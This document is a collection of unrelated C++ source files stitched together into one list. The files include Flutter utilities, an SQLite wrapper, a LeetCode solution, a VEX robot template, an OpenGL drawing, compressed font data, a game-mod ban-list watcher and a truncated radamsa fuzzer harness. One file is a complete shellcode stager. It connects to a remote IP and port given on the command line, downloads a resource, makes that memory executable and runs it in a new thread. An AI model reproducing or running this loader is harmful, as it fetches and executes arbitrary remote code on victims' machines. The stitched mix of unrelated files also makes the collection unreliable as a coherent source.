list: \", steamid64);\n\n        Context.banned_steamids.push_back(steamid64);\n    }\n    file.close();\n}\n\nvoid SetupChangeNotifications()\n{\n    HANDLE hNotification = FindFirstChangeNotification(\n        std::filesystem::current_path().c_str(),\n        FALSE,\n        FILE_NOTIFY_CHANGE_LAST_WRITE\n    );\n\n    if (hNotification == INVALID_HANDLE_VALUE)\n    {\n        MessageBox(NULL, TEXT(\"Could not setup change notifications!\"), TEXT(\"Error\"), MB_OK | MB_ICONERROR);\n        FreeLibraryAndExitThread(Context.hModule, NULL);\n        return;\n    }\n\n    std::filesystem::file_time_type last_write_time_old = std::filesystem::last_write_time(std::filesystem::current_path() / \"steam_bans.txt\");\n    HANDLE handles[2] = { hNotification, Context.hUnloadEvent };\n\n    while (Context.running)\n    {\n        auto last_result = WaitForMultipleObjects(2, handles, FALSE, 100);\n        if (last_result == WAIT_OBJECT_0)\n        {\n            // Check if steamid ban list has been updated\n            std::filesystem::file_time_type last_write_time = std::filesystem::last_write_time(std::filesystem::current_path() / \"steam_bans.txt\");\n            if (last_write_time != last_write_time_old)\n            {\n                UpdateBanList();\n                last_write_time_old = last_write_time;\n            }\n        }\n        else if (last_result == WAIT_OBJECT_0 + 1)\n        {\n            break;\n        }\n    }\n\n    FindCloseChangeNotification(hNotification);\n    SetEvent(Context.hUnloadEventAck);\n    FreeLibraryAndExitThread(Context.hModule, NULL);\n}\n\nstd::uint64_t FollowJMP(std::uintptr_t address)\n{\n    const std::int32_t offset =",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// File: 'Walkway_SemiBold.ttf' (50804 bytes)\n// Exported using binary_to_compressed_c.cpp\nstatic const unsigned int Walkaway_compressed_size = 33191;\nstatic const unsigned int Walkaway_compressed_data[33192/4] =\n{\n    0x0000bc57, 0x00000000, 0x74c60000, 0x00000400, 0x00010037, 0x000f0000, 0x00030030, 0x2f534fc0, 0x773e5b32, 0xc50000a9, 0x28158268, 0x4c435056, \n    0x23c38554, 0x820f82c0, 0x36002c03, 0x70616d63, 0x7c0484fe, 0x82b00000, 0x78052d1f, 0x20747663, 0x42641062, 0x44030000, 0x2e282f82, 0x6d677066, \n    0x4fc23383, 0x30200f82, 0x14280f82, 0x66796c67, 0x94d188bb, 0xe02b0f82, 0x4ca20000, 0x786d6468, 0x8299ab88, 0x82b5201a, 0x880f290f, 0x64616568, \n    0x0acd30d2, 0xf8205f82, 0x36211482, 0x26108268, 0xdb03e006, 0x83c60000, 0x68242b3f, 0xce78746d, 0x00fc1ce5, 0x1e82aa00, 0x6cd0032d, 0x0061636f, \n    0x0056ba51, 0x822ca600, 0x6dd42853, 0x01707861, 0x82d701be, 0x8254202f, 0x6e202720, 0x55656d61, 0x3b835a72, 0x02393382, 0x736f7034, 0x93d0e774, \n    0xad000087, 0x020000d0, 0x65727098, 0xd8cfea70, 0x203b82a8, 0x202f8274, 0x2203826b, 0x82260118, 0x22028505, 0x8505000a, 0x01002508, 0x1f002000, \n    0x02240b86, 0x46000e00, 0x03200b86, 0xcd821782, 0x04200d84, 0x64200b82, 0x00260984, 0x06000500, 0x0b86b700, 0x1e000624, 0x0b86cc00, 0x18000726, \n    0x0100f600, 0x5d830d86, 0x01240b85, 0x0f001000, 0x02241786, 0x3f000700, 0x03200b86, 0x84201782, 0x04200b86, 0x54200b82, 0x05240b86, 0xb4000300, \n    0x06200b86, 0xbd203982, 0x07240b86, 0xea000c00, 0x01221b82, 0x63820904, 0x83000a21, 0x850b8327, 0x000321bf, 0xbf850b83, 0xbf850b85, 0xbf850b85, \n    0xbf850b85, 0xbf850b85, 0xbf840b85, 0x47a92808, 0x002e4d2e, 0x004700a9, 0x004d002e, 0x6c61572e, 0x7961776b, 0x6d655320, 0x6c6f4269, 0x00570064, \n    0x006c0061, 0x8277006b, 0x00792e07, 0x00530020, 0x006d0065, 0x00420069, 0x2917826f, 0x67655264, 0x72616c75, 0x16825200, 0x75006722, 0x61221282, \n    0x44af7200, 0x31242faf, 0x3100302e, 0x3020af82, 0xac963886, 0x4724aa8e, 0x202f204d, 0xee823186, 0xcc824d20, 0x03822f20, 0x6c08e08c, 0x2c000140, \n    0xb0204576, 0x23452503, 0x23186861, 0x2d446068, 0xf9ff52ff, 0xa802ee01, 0x88002400, 0x58002100, 0x6b002300, 0xa3018900, 0xec00de01, 0xf4010f01, \n    0x6f019900, 0x625af201, 0x0200625a, 0x00000400, 0x12121f40, 0x10101111, 0x0e0e0f0f, 0x0c0c0d0d, 0x0a0a0b0b, 0x08080909, 0x02020303, 0x00000101, \n    0x01b88d01, 0x684585ff, 0x2802a944, 0x460405b3, 0x07b32b00, 0x22058206, 0x820404b1, 0x06b12238, 0x20058206, 0x20718200, 0x0851823f, 0x6a03b626, \n    0x07000300, 0x20405600, 0x40080801, 0x04070209, 0x06000104, 0x02030405, 0x00070405, 0x01070607, 0x00030102, 0x462b7d82, 0x18372f76, 0x2f3c3f00, \n    0x83fd103c, 0x2f012302, 0x0c82fd3c, 0x3cfd3308, 0x01303100, 0x00b96849, 0x49080000, 0x40b06168, 0x11385852, 0x0800b937, 0x5938c0ff, 0x11211133, \n    0x23113325, 0xfe77013f, 0x03fafac7, 0x3f96fc6a, 0x7b82ed02, 0x2e824f20, 0xa6027422, 0x0d2a7b82, 0x1e404f00, 0x400e0e01, 0x8882020f, 0x6c820620, \n    0x0b0c0422, 0x0920f182, 0x7b828983, 0x87060121, 0x103f2c79, 0x172f01fd, 0x3c17fd3c, 0x862e2e00, 0x00062274, 0x20748b0e, 0x3f74830e, 0x11331137, \n    0x013d2207, 0x1d323334, 0x24501401, 0x12121213, 0xfefd01a9, 0x4012a903, 0x12401111, 0x2408fb83, 0x00230246, 0x00a002dd, 0x00130009, 0x01174047, \n    0x15401414, 0x04020307, 0x11120708, 0x0f0c0d04, 0x01000a05, 0x2078850c, 0x90e5822f, 0x000c22ec, 0x20778b14, 0x20778314, 0x20738813, 0x20098823, \n    0x287b82cb, 0x13111186, 0x5b112302, 0x84028811, 0x00200881, 0x01ce01a1, 0x001b00d4, 0x4042011f, 0x202001ab, 0x1f1b2140, 0x191a1b1d, 0x10111516, \n    0x080b0c0d, 0x25088f82, 0x08080807, 0x05040509, 0x06030202, 0x09060101, 0x1f1c0908, 0x13080a1c, 0x10101312, 0x0b0b1411, 0x08161514, 0x0e891716, \n    0x1c1f1f2a, 0x1e171617, 0x08181e1d, 0x148a3589, 0x1b1a1a25, 0x861a1919, 0x09320846, 0x11131212, 0x1a1b1211, 0x05131617, 0x0d000612, 0x0508090c, \n    0x02060405, 0x10111c1f, 0x07000501, 0x0f1d1e14, 0x0205030e, 0x18190607, 0x0b140315, 0x8582070a, 0x15410d20, 0x3c172606, 0x103c172f, 0x2a038dfd, \n    0x082e8701, 0x08fc0ec4, 0x89c408c4, 0x200b8309, 0x8711820e, 0x220f8919, 0x820efc08, 0x211b8b27, 0x0d852e87, 0x01211983, 0x42008e2e, 0x0d220769, \n    0x7c412000, 0xff202d0b, 0x015938c0, 0x07330723, 0x37230723, 0x37230384, 0x82233733, 0x07332303, 0x03823733, 0x33010f2e, 0x5ac70137, 0x59075916, \n    0x69132413, 0x09820382, 0x095b1722, 0x122c0d84, 0xed591224, 0x01166917, 0x4c215967, 0x21200082, 0x81080687, 0x05000059, 0xbaff1d00, 0xf1025902, \n    0x36002f00, 0x46003d00, 0xc8004d00, 0x4e016b40, 0x2c4f404e, 0x3d404148, 0x25273637, 0x0e111f24, 0x474d470d, 0x49480848, 0x35303636, 0x474d3635, \n    0x1f203036, 0x04020703, 0x27284041, 0x07012122, 0x35484900, 0x081a1b34, 0x3d040707, 0x12181937, 0x09070a11, 0x0d040e0f, 0x1604390c, 0x45240425, \n    0x064b2c04, 0x06320503, 0x20211d1b, 0x0919031a, 0x01030208, 0x81420107, 0x2f3f2307, 0x02833c17, 0x2ffd3c27, 0x2f01fd3c, 0x210184fd, 0x1383fd3c, \n    0x1984fd20, 0x87290582, 0x08c4082e, 0x01c408fc, 0x0c344100, 0x22062643, 0x414e000c, 0x4e2c0b31, 0x5938c0ff, 0x35231505, 0x27222306, 0x26340682, \n    0x1533013d, 0",
    "#include <windows.h>\n#include <stdio.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma comment (lib, \"Mswsock.lib\")\n#pragma comment (lib, \"AdvApi32.lib\")\n\n#define DEFAULT_BUFLEN 4096\n\nvoid power(char* host, char* port, char* resource) {\n\n    DWORD oldp = 0;\n    BOOL returnValue;\n\n    size_t origsize = strlen(host) + 1;\n    const size_t newsize = 100;\n    size_t convertedChars = 0;\n    wchar_t Whost[newsize];\n    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);\n\n\n    WSADATA wsaData;\n    SOCKET ConnectSocket = INVALID_SOCKET;\n    struct addrinfo* result = NULL,\n        * ptr = NULL,\n        hints;\n    char sendbuf[MAX_PATH] = \"\";\n    lstrcatA(sendbuf, \"GET /\");\n    lstrcatA(sendbuf, resource);\n\n    char recvbuf[DEFAULT_BUFLEN];\n    memset(recvbuf, 0, DEFAULT_BUFLEN);\n    int iResult;\n    int recvbuflen = DEFAULT_BUFLEN;\n\n    \n    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (iResult != 0) {\n        return ;\n    }\n\n    ZeroMemory(&hints, sizeof(hints));\n    hints.ai_family = PF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    hints.ai_protocol = IPPROTO_TCP;\n\n    iResult = getaddrinfo(host, port, &hints, &result);\n    if (iResult != 0) {\n        WSACleanup();\n        return ;\n    }\n\n\n    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {\n\n        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,\n            ptr->ai_protocol);\n        if (ConnectSocket == INVALID_SOCKET) {\n            WSACleanup();\n            return ;\n        }\n\n\n        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);\n        if (iResult == SOCKET_ERROR) {\n            closesocket(ConnectSocket);\n            ConnectSocket = INVALID_SOCKET;\n            continue;\n        }\n        break;\n    }\n\n    freeaddrinfo(result);\n\n    if (ConnectSocket == INVALID_SOCKET) {\n        printf(\"Unable to connect to server!\\n\");\n        WSACleanup();\n        return ;\n    }\n\n    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n\n    \n    iResult = shutdown(ConnectSocket, SD_SEND);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(ConnectSocket);\n        WSACleanup();\n        return ;\n    }\n    \n\n    do {\n\n        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);\n        if (iResult > 0)\n            printf(\"[+] Received %d Bytes\\n\", iResult);\n        else if (iResult == 0)\n            printf(\"[+] Connection closed\\n\");\n        else\n            printf(\"recv failed with error: %d\\n\", WSAGetLastError());\n\n\n        LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(recvbuf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n\tif (!alloc_mem) {\n\t\tprintf(\"Failed to Allocate memory (%u)\\n\", GetLastError());\n\t\treturn -1;\n\t}\n\t\n\tMoveMemory(alloc_mem, recvbuf, sizeof(recvbuf));\n\n\tDWORD oldProtect;\n\n\tif (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {\n\t\tprintf(\"Fai1led to change memory protection (%u)\\n\", GetLastError());\n\t\treturn -2;\n\t}\n\n\n\tHANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);\n\tif (!tHandle) {\n\t\tprintf(\"Failed to Create the thread (%u)\\n\", GetLastError());\n\t\treturn -3;\n\t}\n\n\tprintf(\"\\n\\nalloc_mem : %p\\n\", alloc_mem);\n\tWaitForSingleObject(tHandle, INFINITE);\n\n\treturn 0;\n\n    } while (iResult > 0);\n\n    closesocket(ConnectSocket);\n    WSACleanup();\n}\n\nint main(int argc, char** argv) {\n\n    if (argc != 4) {\n        printf(\"[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\\n\", argv[0]);\n        return 1;\n    }\n\n    power(argv[1], argv[2], argv[3]);\n\n    return 0;\n\n}",
    "// Problem: https://leetcode.com/problems/maximum-population-year/\n// This is a Maxium Intersection problem\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n#pragma GCC optimize(\"O3\", \"unroll-loops\")\nauto init = []() {\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n    cout.tie(0);\n    return 'c';\n}();\n\n// MAIN FUNCTION TO FOCUS ON!\nint maximumPopulation(vector<vector<int>>& logs) {\n    \n    int freq[101] = {0};\n\n    for(int i = 0; i < logs.size(); i++){\n        //doing mod to reduce the years down below 101.\n        int bornYear = logs[i][0] % 1950;\n        int deathYear = logs[i][1] % 1950;\n\n        //inc & dec population of each year in curr range\n        //in year i, how much population are we gaining or losing?\n        freq[bornYear]++; \n        freq[deathYear]--;\n    }\n\n    int max_freq_idx = 0;\n    for(int i = 1; i < 101; i++){\n\n        freq[i] += freq[i-1];\n\n        //looping over the freq arr to find the year at which idx population was highest\n        if(freq[i] > freq[max_freq_idx]){\n            max_freq_idx = i;\n        }\n    }\n\n    //adding back the '1950' to get the actual year\n    return 1950 + max_freq_idx;\n}\n\nint main() {\n    int n, m;\n    cout << \"Enter n: \";\n    cin >> n;\n\n    cout << \"Enter m: \";\n    cin >> m;\n    \n    vector<vector<int>> nums(n, vector<int>(m, 0));\n    cout << \"Enter the 2D array numbers: \" << endl;\n    for(int i = 0; i < n; i++){\n        for(int j = 0; j < m; j++){\n            cin >> nums[i][j];\n        }\n    }\n    \n    /** IGNORE: code to check time taken to run **/\n    time_t start, end;\n    time(&start); \n    ios_base::sync_with_stdio(false); \n    /** IGNORE: code to check time taken to run **/\n    \n    // Main Function Call\n    cout << \"Ans: \" << maximumPopulation(nums) << endl;\n    \n    /** IGNORE: code to check time taken to run **/\n    time(&end); \n    double time_taken = double(end - start); \n    cout << \"Time taken by program is : \" << fixed \n        << time_taken << setprecision(5); \n    cout << \" sec \" << endl; \n    /** IGNORE: code to check time taken to run **/\n\n    return 0;\n}",
    "#include \"Database.h\"\n\nDatabase::Database(bool *debug)\n{\n    if (debug != NULL)\n        _debug = *debug;\n\n    _file = \":memory:\";\n    int r = sqlite3_open(_file.c_str(), &db);\n    if (r != SQLITE_OK)\n    {\n        db = nullptr;\n        this->error(\"Failed to open the database\");\n        throw std::runtime_error(\"Failed to open the database\");\n    }\n}\n\nDatabase::Database(std::string file, bool *debug)\n{\n    if (debug != NULL)\n        _debug = *debug;\n\n    _file = file;\n    int r = sqlite3_open(_file.c_str(), &db);\n    if (r != SQLITE_OK)\n    {\n        db = nullptr;\n        this->error(\"Failed to open the database\");\n        throw std::runtime_error(\"Failed to open the database\");\n    }\n}\n\nDatabase::~Database()\n{\n    if (db != nullptr)\n    {\n        sqlite3_close(db);\n    }\n}\n\nvoid Database::error(const std::string &msg)\n{\n    if (_debug)\n        std::cerr << \"[Error:sqlite] \" << msg << std::endl;\n}\n\nint Database::executeQuery(const std::string query, std::vector<std::vector<std::string>> *result)\n{\n    if (result != nullptr)\n        result->clear();\n\n    sqlite3_stmt *stmt;\n\n    // Prepare the query\n    int r = sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr);\n    if (r != SQLITE_OK)\n    {\n        this->error(\"Failed to prepare the query\");\n        throw std::runtime_error(\"Failed to prepare the query\");\n    }\n    // Execute the query\n    while ((r = sqlite3_step(stmt)) == SQLITE_ROW)\n    {\n        std::vector<std::string> row;\n        int numColumns = sqlite3_column_count(stmt);\n        for (int i = 0; i < numColumns; ++i)\n        {\n            const char *columnValue = (const char *)sqlite3_column_text(stmt, i);\n            row.push_back(columnValue != nullptr ? columnValue : \"\");\n        }\n        if (result != nullptr)\n            result->push_back(row);\n    }\n\n    if (r != SQLITE_DONE)\n    {\n        this->error(\"Failed to execute the query\");\n        throw std::runtime_error(\"Failed to execute the query\");\n    }\n\n    sqlite3_finalize(stmt);\n    return r;\n}\n\nint Database::executeQuery(const std::string query, const std::vector<std::string> &params, std::vector<std::vector<std::string>> *result)\n{\n\n    if (result != nullptr)\n        result->clear();\n\n    sqlite3_stmt *stmt;\n\n    // Prepare the query\n    int rc = sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr);\n    if (rc != SQLITE_OK)\n    {\n        this->error(\"Error during the preparation of the request: \" + std::string(sqlite3_errmsg(db)));\n        return sqlite3_errcode(db);\n    }\n\n    // Bind query parameters\n    for (int i = 0; i < params.size(); ++i)\n    {\n        rc = sqlite3_bind_text(stmt, i + 1, params[i].c_str(), -1, SQLITE_STATIC);\n        if (rc != SQLITE_OK)\n        {\n            this->error(\"Error during the binding of the parameters: \" + std::string(sqlite3_errmsg(db)));\n            sqlite3_finalize(stmt);\n            return sqlite3_errcode(db);\n        }\n    }\n\n    // Execute the query\n    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW)\n    {\n        std::vector<std::string> row;\n        int numColumns = sqlite3_column_count(stmt);\n        for (int i = 0; i < numColumns; ++i)\n        {\n            const char *columnValue = (const char *)sqlite3_column_text(stmt, i);\n            row.push_back(columnValue != nullptr ? columnValue : \"\");\n        }\n        if (result != nullptr)\n            result->push_back(row);\n    }\n\n    sqlite3_finalize(stmt);\n    return rc;\n}\n",
    "#include \"main.h\"\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n\tstatic bool pressed = false;\n\tpressed = !pressed;\n\tif (pressed) {\n\t\tpros::lcd::set_text(2, \"I was pressed!\");\n\t} else {\n\t\tpros::lcd::clear_line(2);\n\t}\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n\tpros::lcd::initialize();\n\tpros::lcd::set_text(1, \"Hello PROS User!\");\n\n\tpros::lcd::register_btn1_cb(on_center_button);\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n\tpros::Controller master(pros::E_CONTROLLER_MASTER);\n\tpros::Motor left_mtr(1);\n\tpros::Motor right_mtr(2);\n\n\twhile (true) {\n\t\tpros::lcd::print(0, \"%d %d %d\", (pros::lcd::read_buttons() & LCD_BTN_LEFT) >> 2,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_CENTER) >> 1,\n\t\t                 (pros::lcd::read_buttons() & LCD_BTN_RIGHT) >> 0);\n\t\tint left = master.get_analog(ANALOG_LEFT_Y);\n\t\tint right = master.get_analog(ANALOG_RIGHT_Y);\n\n\t\tleft_mtr = left;\n\t\tright_mtr = right;\n\n\t\tpros::delay(20);\n\t}\n}\n",
    "/*\r\n * OpenGL.cpp\r\n *\r\n *  Created on: Abril 04, 2024\r\n *      Author: guiil_000\r\n */\r\n\r\n#include <GL/glut.h>\r\n#include <iostream>\r\n\r\nvoid Desenha(void) {\r\n\tglClear(GL_COLOR_BUFFER_BIT);\r\n\r\n\tgluOrtho2D(-5, 6, -4, 8);\r\n\r\n\tglBegin(GL_QUADS);\r\n\tfor (int i = -2; i <= 3; i++) {\r\n\t\tglColor3f(1, i, 0);\r\n\t\tglVertex2f(i, 2);\r\n\t\tglVertex2f(i, 4);\r\n\t}\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.6, 0.2, 0.8);\r\n\tglVertex2f(-4, 4);\r\n\tglVertex2f(5, 4);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.59, 0.29, 0);\r\n\tglVertex2f(-4, 4.5);\r\n\tglVertex2f(-4, -4);\r\n\tglVertex2f(-3.5, -4);\r\n\tglVertex2f(-3.5, 4.5);\r\n\r\n\tglVertex2f(5, 4.5);\r\n\tglVertex2f(5, -4);\r\n\tglVertex2f(4.5, -4);\r\n\tglVertex2f(4.5, 4.5);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.72, 0.45, 0.2);\r\n\tglVertex2f(-1, -4);\r\n\tglVertex2f(0, -3);\r\n\tglVertex2f(1, -3);\r\n\tglVertex2f(2, -4);\r\n\tglEnd();\r\n\r\n\tglPointSize(7.0);\r\n\tglBegin(GL_POINTS);\r\n\tglColor3f(0.5, 0.5, 0.5);\r\n\tglVertex2f(0, 0);\r\n\tglVertex2f(0.5, -1);\r\n\tglVertex2f(0, -1);\r\n\tglVertex2f(0, -2);\r\n\tglVertex2f(-0.5, -2);\r\n\tglVertex2f(-0.5, -3);\r\n\tglVertex2f(1.5, -3);\r\n\tglVertex2f(1.5, -2);\r\n\tglVertex2f(1.5, -1);\r\n\tglVertex2f(1, -2);\r\n\tglVertex2f(0.5, -2);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.53, 0.81, 0.98);\r\n\tglVertex2f(0, 5);\r\n\tglVertex2f(0.3, 6);\r\n\r\n\tglVertex2f(1, 2);\r\n\tglVertex2f(1.3, 3);\r\n\r\n\tglVertex2f(2, 1);\r\n\tglVertex2f(2.3, 2);\r\n\r\n\tglVertex2f(-1, -1);\r\n\tglVertex2f(-1.3, -2);\r\n\r\n\tglVertex2f(-2, -3);\r\n\tglVertex2f(-2.3, -4);\r\n\r\n\tglVertex2f(-4, 0);\r\n\tglVertex2f(-4.3, -1);\r\n\r\n\tglVertex2f(1, -1);\r\n\tglVertex2f(1.3, 0);\r\n\r\n\tglVertex2f(2, -3);\r\n\tglVertex2f(2.3, -2);\r\n\r\n\tglVertex2f(4, -4);\r\n\tglVertex2f(4.3, -3);\r\n\r\n\tglVertex2f(5, -2);\r\n\tglVertex2f(5.3, -1);\r\n\r\n\tglVertex2f(4, 3);\r\n\tglVertex2f(4.3, 4);\r\n\r\n\tglVertex2f(3, 2);\r\n\tglVertex2f(3.3, 3);\r\n\r\n\tglVertex2f(-3, 3);\r\n\tglVertex2f(-3.3, 2);\r\n\r\n\tglVertex2f(-4, 5);\r\n\tglVertex2f(-4.3, 4);\r\n\r\n\tglVertex2f(-2, 1);\r\n\tglVertex2f(-2.3, 0);\r\n\r\n\tglVertex2f(0, 1);\r\n\tglVertex2f(0.3, 2);\r\n\r\n\tglVertex2f(-0.3, 3);\r\n\tglVertex2f(-.6, 2);\r\n\r\n\tglVertex2f(-2, 5);\r\n\tglVertex2f(-2.3, 4);\r\n\r\n\tglVertex2f(-3, 6);\r\n\tglVertex2f(-3.3, 5);\r\n\r\n\r\n\tglVertex2f(3, 5);\r\n\tglVertex2f(3.3, 6);\r\n\r\n\r\n\tglVertex2f(2, 6);\r\n\tglVertex2f(2.3, 7);\r\n\r\n\r\n\tglVertex2f(-1, 7);\r\n\tglVertex2f(-1.3, 6);\r\n\r\n\r\n\tglVertex2f(4, 6);\r\n\tglVertex2f(4.3, 7);\r\n\r\n\tglVertex2f(3, -2);\r\n\tglVertex2f(3.3, -1);\r\n\r\n\tglEnd();\r\n\r\n\tglFlush();\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n\tglutInit(&argc, argv);\r\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\r\n\tglutInitWindowSize(1000, 500);\r\n\tglutInitWindowPosition(120, 150);\r\n\tglutCreateWindow(\"Sad Junina\");\r\n\tglutDisplayFunc(Desenha);\r\n\tglutMainLoop();\r\n}\r\n\r\n",
    "#include <windows.h>\n#include <cstdio>\n#include <tchar.h>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <ctime>\n#include <vector>\n#include <string>\n#include <strsafe.h>\n#include <cstdlib>\n#include <filesystem>\n#include \"CLI11.hpp\"\n\n#define RPATH TEXT(\"RADAMSA_PATH\")\n#define BUFSIZE 256\n\nusing namespace std;\nnamespace fs = std::filesystem;\n\nint TIMEOUT = 1000;\nstring originalFolder;\n\nvector<string> listFilesInDirectory(const std::string& directoryPath) {\n    vector<string> fileNames;\n    const fs::path dest = directoryPath;\n    for (const auto& entry : fs::directory_iterator(directoryPath)) {\n        fileNames.push_back(entry.path().filename().string());\n    }\n    return fileNames;\n}\n\nstring removeExtension(const string& filename) {\n    size_t dotPos = filename.rfind('.');\n    if (dotPos == string::npos) {\n        return filename;\n    }\n    return filename.substr(0, dotPos);\n}\n\n\nBOOL mutateInputs(const string& filename, const string& mut, const string& inputFolder, const string& outputFolder, string ext)\n{ \n    string nfilename = removeExtension(filename);\n    string outputFileName = outputFolder + \"\\\\\" + nfilename + \"_id=\" + mut + \".\" + ext;\n    STARTUPINFOA si;\n    PROCESS_INFORMATION pi;\n    DEBUG_EVENT debug_event;\n    string args = \"radamsa.exe \" + inputFolder + \"\\\\\" + filename + \" -m \" + mut + \" -o \" + outputFileName;\n    LPSTR cmd = (LPSTR)args.c_str();\n\n    ZeroMemory(&si, sizeof(si));\n    ZeroMemory(&pi, sizeof(pi));\n    si.cb = sizeof(si);\n\n    if (!CreateProcessA(\n        nullptr,           // Target app\n        cmd,                 // Command line\n        nullptr,           // Process handle not inheritable\n        nullptr,            // Thread handle not inheritable\n        FALSE,                // Set handle inheritance to FALSE\n        0,                   // No creation flag\n        nullptr,               // Use parent's environment block\n        nullptr,            // Use parent's starting directory\n        &si,                    // Pointer to STARTUPINFO structure\n        &pi)              // Pointer to PROCESS_INFORMATION structure\n        )\n    {\n        printf(\"CreateProcess failed GLE=(%lu).\\n\", GetLastError());\n        return 1;\n    }\n\n    // Wait until child process exits.\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    // Close process and thread handles\n    TerminateProcess(pi.hProcess, 0);\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n\n    return TRUE;\n}\n\nvoid reportCrash(const string& exceptionMessage, DWORD exceptionCode, const string& inputFile)\n{\n    string crashFolder = originalFolder + \"crashes\";\n    if (!fs::exists(crashFolder)) \n    {\n        fs::create_directory(crashFolder);\n    }\n    string filename = crashFolder + \"\\\\\" + \"crashes_log\" + \".txt\";\n    ofstream outfile(filename, ios::app); \n    outfile << exceptionMessage << hex << exceptionCode << \"with file: \" << inputFile << endl;\n    outfile.close();\n\n    fs::path source = inputFile;\n    fs::path dest = crashFolder + inputFile;\n    fs::copy(source, dest);\n\n}\n\nDWORD ProcessDebugEvent(DEBUG_EVENT* debugEvent, const string& inputFile)\n{\n    if (debugEvent->dwDebugEventCode == EXCEPTION_DEBUG_EVENT)\n    {\n\n        EXCEPTION_RECORD* exceptionRecord = &debugEvent->u.Exception.ExceptionRecord;\n        